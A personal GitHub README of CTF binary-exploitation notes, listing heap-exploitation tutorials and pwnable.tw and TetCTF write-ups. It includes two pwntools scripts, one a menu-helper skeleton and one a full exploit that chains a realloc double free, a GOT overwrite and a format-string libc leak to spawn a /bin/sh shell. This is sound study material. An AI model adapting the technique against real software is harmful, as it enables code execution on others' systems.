# Container images, text,... for my Github.

> malloc.c full version: https://elixir.bootlin.com/glibc/glibc-2.29/source/malloc/malloc.c

>Pwnable.tw

   * https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/

   * https://hackmd.io/@wxrdnx/r1CXaFHdv
   
   * https://hackmd.io/@ductin/HyGmQq4w9

> TetCTF
 
  * https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwiEpLqR7qr9AhUR7GEKHbSBCS0QFnoECAwQAQ&url=https%3A%2F%2Fd4rkn3ss.medium.com%2Fwrite-up-for-pwnable-challenges-tetctf-2019-a74eb177518e&usg=AOvVaw0A1Oieo3lMK_KtxWpRGYcH

```python 
#!/usr/bin/env python3 
ptr = 0x603100

from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.2.23.so')
context.log_level = 'DEBUG'

p = elf.process()
gdb.attach(p, '''

''')

def register(name, passwd):
    p.sendafter(b'> ', b'1')
    p.sendafter(b'username\n> ', name)
    p.sendafter(b'password\n> ', passwd)
    p.sendafter(b'password\n> ', passwd)

def login(name, passwd):
    p.sendafter(b'> ', b'2')
    p.sendafter(b'username\n> ', name)
    p.sendafter(b'password\n> ', passwd)


def info(username, password):
    p.sendlineafter(b'> ', b'1')
    p.sendafter(b'username\n> ', username)

def send(username, money):
    p.sendlineafter(b'> ', b'2')
    p.sendafter(b'to?\n', username)
    p.sendlineafter(b'many?\n', str(money).encode())

def view_trans():
    p.sendlineafter(b'> ', b'3')

def change_passwd(password):
    p.sendlineafter(b'> ', b'4')
    p.sendafter(b'password\n> ', password)

def delete():
    p.sendlineafter(b'> ', b'5')

def logout():
    p.sendlineafter(b'> ', b'6')






p.interactive()

```

```python
#!/usr/bin/env python3

heapArr = 0x4040b0
printfPLT = 0x401070
atollPLT = 0x401090
atollGOT = 0x404048

from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so')

p = elf.process()

# p = gdb.debug('./vuln', gdbscript='''
#     b *menu
# 	b *allocate
#     b *rfree
#     b *reallocate
# ''')

gdb.attach(p, gdbscript='''
	b *0x000000000040133c
    b *rfree
    b *reallocate
''')
context.log_level = 'DEBUG'
#p = remote('chall.pwnable.tw', '10106')

def Allocate(index, size, data):
    p.sendlineafter(b'choice: ', str(1))
    p.sendlineafter(b'Index:', str(index))
    p.sendlineafter(b'Size:', str(size))
    p.sendlineafter(b'Data:', data)

def Reallocate(index, size, data):
    p.sendlineafter(b'choice: ', str(2))
    p.sendlineafter(b'Index:', str(index))
    p.sendlineafter(b'Size:', str(size))
    if size == 0:
        return
    else:
        p.sendlineafter(b'Data:', data)

def rFree(index):
    p.sendlineafter(b'choice: ', str(3))
    p.sendlineafter(b'Index:', str(index))

def Free(index):
    p.sendlineafter(b'choice: ', str(3))
    p.sendlineafter(b'Index:', index)


# 1
Allocate(1, 16, b'a'*15)
# Double Free
# size = 0 => free(1) but not set heapArr[1] = 0
Reallocate(1, 0, p64(atollGOT)) 
Reallocate(1, 16, p64(atollGOT))
Allocate(0, 16, b'a'*15)


Reallocate(1, 32, b'a'*31)
rFree(1)

Allocate(1, 16, p64(printfPLT))


# leak
pause()
Free(b'%21$p')

leak = p.recvline().strip()
libc_start_main = int(leak, 16) - 235 

libc_Base = libc_start_main - libc.symbols['__libc_start_main'] 
system = libc_Base + libc.symbols['system']

log.success('__libc_start_main+235: ' + hex(libc_start_main+235))
log.success('Libc base:             ' + hex(libc_Base))
log.success('system:                ' + hex(system))

Reallocate(1, 16, p64(system)) # bug

Free(b'/bin/sh')



p.interactive()

```

>Heap

   * https://infosecwriteups.com/heap-exploitation-journey-1-tcache-attack-5b38fb0c19b0

   * https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/

   * https://dangokyo.me/2017/12/14/0ctf-2016-quals-pwn-zerostorage-write-up/

   * https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/unsorted_bin_attack/

   * https://www.lazenca.net/pages/viewpage.action?pageId=51970214

   * https://lantern.cool/note-pwn-free-hook/#参考

   * https://ctf-wiki.org/pwn/linux/user-mode/environment/

   * https://one2bla.me/the-dark-arts/common-vulnerabilities/unsortedbin-attack.html


